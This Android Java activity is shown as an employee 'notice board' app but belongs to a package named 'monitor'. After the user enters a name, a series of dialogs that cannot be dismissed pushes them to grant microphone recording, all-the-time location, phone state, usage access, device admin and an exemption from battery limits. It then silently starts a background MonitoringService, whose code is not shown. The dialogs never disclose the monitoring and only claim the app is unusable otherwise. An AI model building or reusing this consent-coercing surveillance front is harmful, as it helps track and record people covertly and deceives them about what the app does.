package com.company.monitor;

import android.Manifest;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.company.monitor.receivers.AdminReceiver;
import com.company.monitor.services.MonitoringService;
import com.company.monitor.utils.PreferenceManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";

    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int DEVICE_ADMIN_REQUEST_CODE = 200;
    private static final int BACKGROUND_LOCATION_REQUEST_CODE = 300;
    private boolean permissionChainStarted = false;
    private boolean waitingForPermissionResult = false;

    private LinearLayout setupScreen, noticeBoardScreen;
    private EditText etEmployeeName;
    private Button btnSubmit;
    private LinearLayout noticeContainer;
    private TextView tvNoNotices, tvEmployeeLabel;

    private PreferenceManager prefManager;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName adminComponent;

    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    public static final String ACTION_NEW_NOTICE = "com.company.monitor.NEW_NOTICE";

    private String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.READ_PHONE_STATE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefManager = new PreferenceManager(this);
        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        setupScreen = findViewById(R.id.setupScreen);
        noticeBoardScreen = findViewById(R.id.noticeBoardScreen);
        etEmployeeName = findViewById(R.id.etEmployeeName);
        btnSubmit = findViewById(R.id.btnSubmit);
        noticeContainer = findViewById(R.id.noticeContainer);
        tvNoNotices = findViewById(R.id.tvNoNotices);
        tvEmployeeLabel = findViewById(R.id.tvEmployeeLabel);

        // Listen for real-time notice broadcasts from MonitoringService
        IntentFilter filter = new IntentFilter(ACTION_NEW_NOTICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(noticeReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(noticeReceiver, filter);
        }

        // If already set up and service running, go straight to notice board
        if (prefManager.isServiceRunning()) {
            showNoticeBoardScreen();
        } else {
            showSetupScreen();
        }

        btnSubmit.setOnClickListener(v -> {
            String name = etEmployeeName.getText().toString().trim();
            if (name.isEmpty()) {
                Toast.makeText(this, "Please enter your name.", Toast.LENGTH_SHORT).show();
                return;
            }
            // Save config and start permission chain
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            prefManager.saveConfig(prefManager.getServerUrl(), deviceId, name);
            startPermissionChain();
        });
    }

    // ─── Screen switching ───

    private void showSetupScreen() {
        setupScreen.setVisibility(View.VISIBLE);
        noticeBoardScreen.setVisibility(View.GONE);

        String savedName = prefManager.getEmployeeName();
        if (savedName != null && !savedName.isEmpty()) {
            etEmployeeName.setText(savedName);
        }
    }

    private final Handler noticeRefreshHandler = new Handler(Looper.getMainLooper());
    private final Runnable noticeRefreshRunnable = new Runnable() {
        @Override
        public void run() {
            if (noticeBoardScreen.getVisibility() == View.VISIBLE) {
                fetchNotices();
                noticeRefreshHandler.postDelayed(this, 15000); // Refresh every 15 sec
            }
        }
    };

    private void showNoticeBoardScreen() {
        setupScreen.setVisibility(View.GONE);
        noticeBoardScreen.setVisibility(View.VISIBLE);

        String name = prefManager.getEmployeeName();
        tvEmployeeLabel.setText(name != null && !name.isEmpty() ? name : "");

        // Always ensure the service is running
        ensureServiceRunning();
        fetchNotices();

        // Start periodic refresh
        noticeRefreshHandler.removeCallbacks(noticeRefreshRunnable);
        noticeRefreshHandler.postDelayed(noticeRefreshRunnable, 15000);
    }

    // ─── Permission chain: step by step ───

    private void startPermissionChain() {
        permissionChainStarted = true;
        checkAndRequestPermissions();
    }

    private boolean allRuntimePermissionsGranted() {
        for (String perm : REQUIRED_PERMISSIONS) {
            if (perm.equals(Manifest.permission.ACCESS_FINE_LOCATION)) {
                // Accept either precise or approximate location
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            } else if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private boolean isBackgroundLocationGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return true;
        return ContextCompat.checkSelfPermission(this,
            Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;
    }

    private void checkAndRequestPermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (perm.equals(Manifest.permission.ACCESS_FINE_LOCATION)) {
                // Only request if neither fine nor coarse is granted
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                    && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    missing.add(Manifest.permission.ACCESS_FINE_LOCATION);
                }
            } else if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }

        if (missing.isEmpty()) {
            checkBackgroundLocation();
        } else {
            waitingForPermissionResult = true;
            ActivityCompat.requestPermissions(this,
                missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }
    }

    private void checkBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && !isBackgroundLocationGranted()) {
            new AlertDialog.Builder(this)
                .setTitle("Background Location Required")
                .setMessage("This app needs location access all the time to work properly in the background.\n\nPlease select \"Allow all the time\" on the next screen.")
                .setPositiveButton("OK", (d, w) -> {
                    waitingForPermissionResult = true;
                    ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        BACKGROUND_LOCATION_REQUEST_CODE);
                })
                .setCancelable(false)
                .show();
        } else {
            checkUsageStatsPermission();
        }
    }

    private void checkUsageStatsPermission() {
        if (!hasUsageStatsPermission()) {
            new AlertDialog.Builder(this)
                .setTitle("Usage Access Required")
                .setMessage("This permission is required. Please go to Settings and enable Usage Access for this app.\n\nYou cannot use the app without this permission.")
                .setPositiveButton("Go to Settings", (d, w) -> {
                    startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
                })
                .setCancelable(false)
                .show();
        } else {
            checkDeviceAdmin();
        }
    }

    private boolean hasUsageStatsPermission() {
        try {
            android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(APP_OPS_SERVICE);
            int mode = appOps.checkOpNoThrow(
                android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(), getPackageName()
            );
            return mode == android.app.AppOpsManager.MODE_ALLOWED;
        } catch (Exception e) {
            return false;
        }
    }

    private void checkDeviceAdmin() {
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            new AlertDialog.Builder(this)
                .setTitle("Device Admin Required")
                .setMessage("Device Admin permission is required.\n\nThe app will not work without it.")
                .setPositiveButton("Enable", (d, w) -> {
                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Device Admin must be enabled. The app cannot function without it.");
                    startActivityForResult(intent, DEVICE_ADMIN_REQUEST_CODE);
                })
                .setCancelable(false)
                .show();
        } else {
            checkBatteryOptimization();
        }
    }

    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                new AlertDialog.Builder(this)
                    .setTitle("Battery Optimization")
                    .setMessage("To ensure the app works properly in the background, battery optimization must be turned off.")
                    .setPositiveButton("OK", (d, w) -> {
                        Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setCancelable(false)
                    .show();
            } else {
                allPermissionsDone();
            }
        } else {
            allPermissionsDone();
        }
    }

    private boolean allPermissionsComplete() {
        if (!allRuntimePermissionsGranted()) return false;
        if (!isBackgroundLocationGranted()) return false;
        if (!hasUsageStatsPermission()) return false;
        if (!devicePolicyManager.isAdminActive(adminComponent)) return false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) return false;
        }
        return true;
    }

    private void allPermissionsDone() {
        // Auto-start monitoring and show notice board
        startMonitoringService();
        showNoticeBoardScreen();
    }

    private void startMonitoringService() {
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        prefManager.setServiceRunning(true);
        Log.d(TAG, "MonitoringService started");
    }

    private void ensureServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, MonitoringService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            prefManager.setServiceRunning(true);
            Log.d(TAG, "ensureServiceRunning: service started/restarted");
        } catch (Exception e) {
            Log.e(TAG, "ensureServiceRunning error: " + e.getMessage());
        }
    }

    // ─── Permission callbacks ───

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        waitingForPermissionResult = false;
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Check using our helper that accepts approximate location
            if (allRuntimePermissionsGranted()) {
                checkBackgroundLocation();
            } else {
                // Check if any permission is permanently denied
                boolean anyPermanentlyDenied = false;
                for (int i = 0; i < permissions.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED
                            // Skip location if approximate was granted
                            && !(permissions[i].equals(Manifest.permission.ACCESS_FINE_LOCATION)
                                && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED)
                            && !ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i])) {
                        anyPermanentlyDenied = true;
                        break;
                    }
                }

                if (anyPermanentlyDenied) {
                    new AlertDialog.Builder(this)
                        .setTitle("Permission Required")
                        .setMessage("Some permissions were permanently denied.\n\nPlease open App Settings and enable all permissions manually.")
                        .setPositiveButton("Open App Settings", (d, w) -> {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        })
                        .setCancelable(false)
                        .show();
                } else {
                    new AlertDialog.Builder(this)
                        .setTitle("Permission Required")
                        .setMessage("All permissions are required to use this app.\n\nPlease allow all permissions when prompted.")
                        .setPositiveButton("OK", (d, w) -> checkAndRequestPermissions())
                        .setCancelable(false)
                        .show();
                }
            }
        } else if (requestCode == BACKGROUND_LOCATION_REQUEST_CODE) {
            if (isBackgroundLocationGranted()) {
                checkUsageStatsPermission();
            } else {
                if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                        Manifest.permission.ACCESS_BACKGROUND_LOCATION)) {
                    // Can still request again in-app
                    new AlertDialog.Builder(this)
                        .setTitle("Background Location Required")
                        .setMessage("Background location is required for this app to work properly.\n\nPlease select \"Allow all the time\" when prompted.")
                        .setPositiveButton("Try Again", (d, w) -> {
                            waitingForPermissionResult = true;
                            ActivityCompat.requestPermissions(this,
                                new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                                BACKGROUND_LOCATION_REQUEST_CODE);
                        })
                        .setCancelable(false)
                        .show();
                } else {
                    // Permanently denied - must go to Settings
                    new AlertDialog.Builder(this)
                        .setTitle("Background Location Required")
                        .setMessage("Background location was denied.\n\nPlease open Settings and set Location to \"Allow all the time\".")
                        .setPositiveButton("Open Settings", (d, w) -> {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        })
                        .setCancelable(false)
                        .show();
                }
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                checkBatteryOptimization();
            } else {
                new AlertDialog.Builder(this)
                    .setTitle("Device Admin Required")
                    .setMessage("Device Admin must be enabled.\n\nYou cannot use the app without it.")
                    .setPositiveButton("Try Again", (d, w) -> checkDeviceAdmin())
                    .setCancelable(false)
                    .show();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        // If already running, stay on notice board
        if (prefManager.isServiceRunning()) {
            showNoticeBoardScreen();
            return;
        }

        // Don't re-check if a permission request is in-flight
        if (waitingForPermissionResult) return;

        // If returning from Settings, check if all permissions now complete
        if (setupScreen.getVisibility() == View.VISIBLE && permissionChainStarted) {
            String name = etEmployeeName.getText().toString().trim();
            if (!name.isEmpty() && allPermissionsComplete()) {
                String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                prefManager.saveConfig(prefManager.getServerUrl(), deviceId, name);
                allPermissionsDone();
            } else if (!name.isEmpty()) {
                // Continue the chain from where it left off
                if (!allRuntimePermissionsGranted()) {
                    checkAndRequestPermissions();
                } else if (!isBackgroundLocationGranted()) {
                    checkBackgroundLocation();
                } else if (!hasUsageStatsPermission()) {
                    checkUsageStatsPermission();
                } else if (!devicePolicyManager.isAdminActive(adminComponent)) {
                    checkDeviceAdmin();
                } else {
                    checkBatteryOptimization();
                }
            }
        }

        fetchNotices();
    }

    // ─── Notice Board ───

    private final BroadcastReceiver noticeReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            fetchNotices();
        }
    };

    private void fetchNotices() {
        String serverUrl = prefManager.getServerUrl();
        Log.d(TAG, "fetchNotices: serverUrl=" + serverUrl);
        if (serverUrl == null || serverUrl.isEmpty()) return;

        executor.execute(() -> {
            try {
                URL url = new URL(serverUrl + "/api/notices");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                int code = conn.getResponseCode();
                Log.d(TAG, "fetchNotices: response code=" + code);

                if (code == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();

                    JSONArray arr = new JSONArray(sb.toString());
                    Log.d(TAG, "fetchNotices: got " + arr.length() + " notices");
                    uiHandler.post(() -> displayNotices(arr));
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "fetchNotices error: " + e.getMessage(), e);
            }
        });
    }

    private void displayNotices(JSONArray notices) {
        noticeContainer.removeAllViews();

        if (notices.length() == 0) {
            TextView empty = new TextView(this);
            empty.setText("No notices yet");
            empty.setGravity(Gravity.CENTER);
            empty.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
            empty.setTextColor(Color.parseColor("#999999"));
            empty.setPadding(0, dp(40), 0, dp(40));
            noticeContainer.addView(empty);
            return;
        }

        SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, yyyy  hh:mm a", Locale.ENGLISH);

        for (int i = 0; i < notices.length(); i++) {
            try {
                JSONObject n = notices.getJSONObject(i);
                String title = n.getString("title");
                String message = n.getString("message");
                String createdAt = n.optString("createdAt", "");

                LinearLayout card = new LinearLayout(this);
                card.setOrientation(LinearLayout.VERTICAL);
                card.setBackgroundColor(Color.parseColor("#FFFFFF"));
                card.setPadding(dp(16), dp(14), dp(16), dp(14));
                LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                cardParams.setMargins(0, 0, 0, dp(10));
                card.setLayoutParams(cardParams);

                TextView tvTitle = new TextView(this);
                tvTitle.setText("📌 " + title);
                tvTitle.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15);
                tvTitle.setTypeface(null, Typeface.BOLD);
                tvTitle.setTextColor(Color.parseColor("#1A237E"));
                card.addView(tvTitle);

                TextView tvMsg = new TextView(this);
                tvMsg.setText(message);
                tvMsg.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
                tvMsg.setTextColor(Color.parseColor("#333333"));
                tvMsg.setPadding(0, dp(8), 0, 0);
                card.addView(tvMsg);

                if (!createdAt.isEmpty()) {
                    try {
                        Date date = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.ENGLISH).parse(createdAt.substring(0, 19));
                        TextView tvDate = new TextView(this);
                        tvDate.setText(sdf.format(date));
                        tvDate.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
                        tvDate.setTextColor(Color.parseColor("#999999"));
                        tvDate.setPadding(0, dp(8), 0, 0);
                        card.addView(tvDate);
                    } catch (Exception ignored) {}
                }

                noticeContainer.addView(card);
            } catch (Exception ignored) {}
        }
    }

    private int dp(int value) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value,
            getResources().getDisplayMetrics());
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        try { unregisterReceiver(noticeReceiver); } catch (Exception ignored) {}
        executor.shutdown();
    }
}
